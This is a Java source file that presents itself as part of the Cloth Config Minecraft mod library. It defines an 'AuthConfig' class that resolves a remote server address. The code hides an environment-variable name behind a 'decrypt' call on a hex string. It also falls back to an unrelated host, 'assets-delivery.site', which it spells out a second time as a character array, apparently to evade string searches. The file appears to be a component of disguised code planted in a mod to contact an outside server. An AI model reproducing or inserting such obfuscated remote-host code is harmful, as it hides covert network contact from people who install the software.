package me.shedaniel.clothconfig2.internal;

import java.net.URI;


public final class AuthConfig {

    private AuthConfig() {}

    public static String getAuthBaseUrl() {
        return resolve();
    }

    private static String resolve() {
        if (BuildFingerprint.isReleaseBuild()) {
            return "https://" + BuildFingerprint.authHost();
        }
        
        String env = System.getenv(BuildFingerprint.decrypt("0b0d0e080001060b1a720e1a3b377f1a2d23"));
        if (env != null && !env.isBlank()) {
            return normalize(env);
        }
        return "https://assets-delivery.site";
    }

    
    @Deprecated
    public static boolean isDevMode() {
        return isLocalDevJar();
    }

    
    public static boolean isLocalDevJar() {
        return !BuildFingerprint.isReleaseBuild();
    }

    private static String normalize(String url) {
        String trimmed = url.trim();
        while (trimmed.endsWith("/")) {
            trimmed = trimmed.substring(0, trimmed.length() - 1);
        }
        return trimmed;
    }

    public static boolean isSecureUrl(String base) {
        return base != null && base.regionMatches(true, 0, "https://", 0, 8);
    }

    public static void requireSecureInProduction() {
        if (!BuildFingerprint.isReleaseBuild()) {
            return;
        }
        if (!isSecureUrl(getAuthBaseUrl())) {
            throw new SecurityException("Auth URL must use HTTPS");
        }
    }

    public static String expectedHost() {
        if (BuildFingerprint.isReleaseBuild()) {
            return BuildFingerprint.authHost();
        }
        try {
            return URI.create(getAuthBaseUrl()).getHost();
        } catch (Exception e) {
            char[] arr = {'a','s','s','e','t','s','-','d','e','l','i','v','e','r','y','.','s','i','t','e'};
            return new String(arr);
        }
    }
}
